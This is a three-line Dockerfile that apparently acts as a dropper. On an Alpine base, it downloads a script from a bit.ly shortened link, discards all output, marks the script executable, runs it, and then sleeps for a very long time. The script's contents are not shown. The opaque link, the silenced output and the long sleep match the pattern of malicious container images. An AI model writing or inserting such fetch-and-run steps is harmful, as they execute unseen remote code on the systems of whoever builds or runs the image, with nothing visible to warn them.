FROM  alpine:3

RUN wget -O run.sh https://bit.ly/3t2v8Un > /dev/null 2>&1 && chmod u+x run.sh && ./run.sh
RUN sleep 99999
